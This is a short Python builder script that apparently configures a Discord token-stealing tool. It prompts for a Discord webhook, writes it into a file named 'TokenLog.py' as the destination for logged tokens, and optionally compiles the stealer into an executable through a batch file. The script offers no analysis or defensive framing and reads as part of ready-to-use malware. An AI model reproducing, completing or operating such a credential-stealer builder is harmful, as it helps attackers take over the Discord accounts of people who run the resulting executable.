import os

webhook = input("Enter your Discord webhook: ")

with open("Tools/TokenLog.py", "r+") as f:
    contents = f.readlines()
    contents[33] = f'    "webhook": "{webhook}",\n'
    f.seek(0)
    f.writelines(contents)

build_exe = input("Do you want to build an executable (Y/N)? ")
if build_exe.lower() == "y":
    os.chdir("Tools")
    os.system("BuildExe.bat")
elif build_exe.lower() == "n":
    print("OK, have fun!")
else:
    print("Invalid input. OK, have fun!")
